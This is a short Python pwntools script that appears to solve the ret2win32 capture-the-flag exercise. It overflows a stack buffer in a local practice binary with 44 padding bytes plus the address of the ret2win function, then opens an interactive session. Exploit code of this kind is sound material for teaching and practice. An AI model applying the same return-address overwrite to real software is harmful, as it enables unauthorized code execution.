from pwn import *
e = ELF("./ret2win32")
p = process("./ret2win32")
ret2win = p32(e.symbols["ret2win"])
print ret2win
print p.recv()
p.sendline("a"*44+ret2win)

print p.recv()

p.interactive()

